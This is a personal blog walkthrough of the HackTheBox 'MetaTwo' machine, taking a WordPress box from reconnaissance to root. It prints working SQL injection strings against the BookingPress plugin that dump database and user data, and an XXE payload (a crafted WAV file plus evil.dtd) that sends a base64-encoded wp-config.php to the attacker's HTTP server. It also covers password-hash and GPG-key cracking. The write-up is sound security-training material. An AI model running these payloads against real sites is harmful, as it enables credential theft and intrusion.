---
id: 8
title: CTF Walkthroughs - MetaTwo
description: My walkthrough of the MetaTwo machine on HackTheBox.com
publishedDate: 02/11/2023
featureImage: https://i.imgur.com/8NSIwZRh.png
---

## Intro

Hello Internet!
So I'm trying to build up a bit of a streak here on getting a certain number of machines every couple weeks, so here is another one for you! This machine is MetaTwo, it's an active machine on HackTheBox and is rated an easy. Let's see how this goes!

## Recon

As I mentioned in my last post, I'm adding [threader3000](https://github.com/dievus/threader3000) to my list of regular tools, so lets fire up the script and see what we get!

`python threader3000.py`

![8c5c29247596148f6aa5e5459a1f01ac.png](https://i.imgur.com/A62I6cr.png)
OK, there's kind of a lot to take in from the threader results in one screenshot, but looks like ports 21,22 and 80 are open.

This screenshot is actually from the second time I ran threader3000. The first time I ran it, the nmap portion had a redirect to http://metapress.htb, so I added that to my /etc/host file before running this a second time. Looks like nmap brought back a version of WordPress in the HTTP-generator header. So looks like this is some sort of WordPress site, let's take a look with a browser!

![3ab9feabf961a407b941de71c40bcbb3.png](https://i.imgur.com/8NSIwZR.png)
Ok, yeah looks like this is a pretty generic WordPress site so far. I started going through some of the posts in there, and found out there's an author **admin** so if I want to try bruteforcing, at least I have the username!

I'm going to try using WPScan now so that I can see if there are any WordPress vulnerabilities on this instance.

![86aead415a66991e80315c9ccec996fa.png](https://i.imgur.com/GlaZvno.png)![83b36ad65a2ab84a053b26ad037bf284.png](https://i.imgur.com/eDUMEgn.png)
Ok, looks like this site is using WordPress version 5.6.2, and is using the TwentyTwentyOne theme. I'm going to keep browsing the site a little to see if there's anything of note.

![b706d5ca1a686690de79fe86ddd65c80.png](https://i.imgur.com/J3gyeG3.png)Hmmm, that's an interesting robots.txt, why would they allow that admin-ajax.php file? Guess I better check out the sitemap as well.
![cf460c18800ae4daf7caa09d5c9f2a0c.png](https://i.imgur.com/BZxL0A4.png)
That leads to a couple of other sitemaps, here's users:
![847686a34da26b776a25f3a743cd7843.png](https://i.imgur.com/hIs2Qm1.png)
And pages:
![af4a29986191fd86ed4223c11840de69.png](https://i.imgur.com/bWkUHVj.png)Interesting, looks like there are some payment pages, a page for cancelling an appointment, and an events page.... Let's check it out!
The cancelling an appointment page doesn't really bring up much, but the events page looks interesting!
![711068e3864bd9236722d3d7bf2db336.png](https://i.imgur.com/kptmEl5.png)

## Bookingpress SQLi

Ok, it looks like some sort of WP Plugin is in use, but it didn't get picked up by WPScan.
At this point, there were two things that I found. When I noticed that WPScan hadn't picked up any plugins, I thought that was a little odd, because almost every WP site I've ever been around always has a TON of plugins! So I hopped on the forumn for this machine to see if anyone else had similar problems with WPScan, and I found a bunch of people recommending to use the BurpSuite extension version of WPScan.
The second thing I found was that when I was checking in the debugger tab of my browser, I found some JS files on the events page for the calendar plugin, and it looks like the plugin is bookingpress.
![98e4ad0e691ab487db3c616ddcbbb67c.png](https://i.imgur.com/00sjIcz.png)
After fiddling around with BurpSuite for a while too (had to install Jython's standalone JAR), I was able to install the WordPress Scanner extension on BurpSuite, and was able to find out what version of this plugin is running.

![0c27de832b03d3afef72c93cf534d7dc.png](https://i.imgur.com/C0yU0wr.png)
A quick check on the [WPScan vulnerabilities page](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357), and it looks like there's a SQL Injection vulnerability on this version of the bookingpress plugin!

![94770f0eb96e7c5ff48047c873270210.png](https://i.imgur.com/oVz1BlK.png)
I'm thinking this is probably going to be how we get the WP credentials to log in to the wp-admin side of the site.
As you can see from the screenshot, WPScan includes a proof of concept on the SQLi. It's specifically the AJAX action bookingpress_front_get_category_services (which is available to unauthenticated users) that doesn't properly check for inputs, leading to the SQLi vulnerability.

I tried running the curl proof of concept pointed at the HTB instance, but I was getting an authentication error. In noticed when going through burpsuite though that the admin-ajax.php call is executed while loading the calendar, so I sent this request to the repeater tab in BurpSuite, and changed the ajax action to the vulnerable action:

![848cf7529134eabee4416a87e88a754d.png](https://i.imgur.com/4NefDL4.png)
Heyyyy, proof of concept SQLi is working!

Ok, so now that I have that entrypoint, time to find the WordPress database and see if I can pull login credentials. I start off with this SQLi query to pull all of the databases that are on this MySQL instance. Unfortunately I'm not able to inject any single or double quotes to trigger a better where clause, so I'm just keeping the queries fairly open.
`action=bookingpress_front_get_category_services&_wpnonce=0bc601c881&category_id=33&total_service=-7502) UNION ALL SELECT concat(schema_name),null,null,null,null,null,null,null,null from information_schema.schemata limit 10-- -`
![1848d406b785c2f162c4efed22c1dd84.png](https://i.imgur.com/8u6Pvq5.png)
I think I'll take a stab at thinking the WP database is probably the blog one.
I can verify that by looking for WP tables. This part took a little bit longer, since I can't inject any quotes, I can add a where clause that's like "WHERE table_schema='blog'" or something like that, so I'm looking at all of the tables in the two schemas, and limiting my results to 10-20 rows at a time to prevent the request from breaking. Here's the first one that finally started bringing up blog database tables:
`action=bookingpress_front_get_category_services&_wpnonce=0bc601c881&category_id=33&total_service=-7502) UNION ALL SELECT concat(table_schema,00,table_name),null,null,null,null,null,null,null,null from information_schema.tables limit 57,64-- -`
![9f7d8a815463142507a77db1407a62fb.png](https://i.imgur.com/Uj5iYy2.png)In this request I'm concatenating together the schema name and table name (separated by a 0), so the service_id that spells "blog0wp_options" is the wp_options table in the blog database!

## Cracking WP User

So that's good then, looks like the blog database has all of the WordPress data that we need. What I need is to pull data from the wp_users table, this table typically has the usernames and Hashes of the passwords.
`action=bookingpress_front_get_category_services&_wpnonce=0bc601c881&category_id=33&total_service=-7502) UNION ALL SELECT concat(user_login),null,null,null,null,null,null,null,null from blog.wp_users limit 10-- -`
![31b043827f261d074627c89108e7eb92.png](https://i.imgur.com/or45dHe.png)This query brings back all of the users' usernames. Looks like there are two, admin and manager.

Here's a quick screenshot of the hashes
![0c4e87fecceb2eda940b1b645bd045e5.png](https://i.imgur.com/ziyhqLo.png)
Ok, we have usernames and hashes of passwords, time to fire up John the Ripper and see if we can get a password out of these hashes!
If you're following along at home, the rockyou.txt credentials list worked on cracking the manager password, now I'm able to log into wp-admin!
![e6904b7618606f6c8211b97cf8ec1773.png](https://i.imgur.com/Cvvo8Zn.png)We're in!

## XXE and wp-config

Ok, I didn't mention this earlier, but when I used WPScan initially, I was sure that the foothold I was going to need to get shell access was probably something either tied to the version of PHP it was running, or the version of WordPress. The version of WordPress on this machine (5.6.2) does have a severe local file disclosue vulnerability, triggered through an XML External Entity (XXE) vulnerability. This is triggered where a malformed WAV file uploaded into the wordpress admin media manager, can transmit an encoded version of whatever local file is on that target system.
There's a much better walkthrough of this vulnerability on the [wpsec blog](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447), but the crux of this vulnerability is if I can read the wp-config.php file that's on the metapress.htb machine, the local user credentials are stored on this config file, and I can use those credentials to SSH into the box.

First, I copied the payload offered in the WPSec blog, changing the IP address to match my kali box
`echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.4:9123/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
`
Next, I created an endpoint (evil.dtd) that the payload will import as XML, and that the payload then uses to disclose the wp-config.php file

`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:9123/?p=%file;'>" >`

Next, I stand up an http server in the directory where the evil.dtd file is:

`python -m http.server --bind 10.10.14.4 9123`

Finally, I uploaded the payload.wav file to the WordPress media manager, and a base64 encoded copy of the wp-config.php file was sent to the http server!
Here's what it looked like from the console
![84b1ae361baea8040f5e11b8148e2ea7.png](https://i.imgur.com/YOB2Pyt.png)
Now just to decode the text
![1382fd1feb3cec2ae123e3d22aa71100.png](https://i.imgur.com/4Zw8rkF.png)
And we have a complete wp-config.php file on the kali box!
![934f00cf11864791dfbaedc4978c02d2.png](https://i.imgur.com/NtAGGvd.png)

## FTP to SSH

Ok, so now we have ftp credentials, time to log onto the ftp side of metapress.htb and see if we can find anything.
![539e91c13f7fb2a1dc8da926c228dc39.png](https://i.imgur.com/P0J9i9u.png)Looks like there are two directories, blog and mailer. I decided to start with the mailer directory, to see if maybe there were additional accounts used for sending mail. Sure enough, inside that directory is a file, send_email.php, let's take a look!
![1a98ef41db116717a232d1e89055e5d1.png](https://i.imgur.com/nG3ZN4l.png)Sweet, looks like we have a local account on metapress.htb!

I go ahead and exit out of the ftp (I might come back to it later if I get stuck again) and try to ssh into metapress.htb with these credentials
![95f0574087060ed9c317cacf9ce4b75d.png](https://i.imgur.com/fPiwkGi.png)We're in!!

I didn't take a screenshot, but the user.txt flag is in the home directory!

## Privilege Escalation

I started by checking for any sudo privileges, possible SUID and SGID commands that can be taken advantage of, and just using the find command to see if I could find the root.txt file without any escalation. Unfortunately I wasn't getting anywhere with those checks, so I started looking for hidden files. I ended up seeing some hidden files in the user's home directory
![68f33f0bfc398ebbac34983050df21b3.png](https://i.imgur.com/MKL047p.png)
I notice there's a passpie directory, and passpie is a command line password manager, maybe we can find something in there?
Inside the directory is a hidden file labeled ".keys", let's see what's in there!
![8ab5909e971bef63366d0567999868c5.png](https://i.imgur.com/xzHVKzU.png)Looks like it's a private key of some sort, lets copy it locally and see if we can do anything with it.
This part I hadn't actually used gpg2john yet, I had looked in the MetaTwo forum a bit though and found the recommendation, so let's do it!

`gpg2john hash > outputfile`

![883156797fa65201d5c7baaa224e0f0b.png](https://i.imgur.com/qhg1II9.png)Looks like it's a hash of passpie passwords, let's see if rockyou.txt passwords were used!
![dc248f80b72d964089033893db34410e.png](https://i.imgur.com/qQx1GqI.png)We were able to crack it!
OK, time to run passpie and see if we can recover anything
![6075786afee4d27e2bd24d6757dcf278.png](https://i.imgur.com/9Ebdxx7.png)We have root credentials!

![eecaf652ff38d88f187534af1bd16f7a.png](https://i.imgur.com/bKJAL4S.png)And I'm in as root!
The root flag was just in the root directory.

## Conclusion

Overall I really enjoyed this machine! I personally think this was a little tougher than most of the other "easy" boxes I've come across so far (except maybe soccer, that was a tough one too), a decent bit of enumeration and the initial foothold to get shell access seemed to me very much like a real world scenario! I thought the privilege escalation could have maybe used something like a rogue SUID enabled command or sudo privilege that could be taken over, but I learned a little bit about passpie and feel like I got something done this time around!
Welp, that's all for now, we'll see you on the next one!
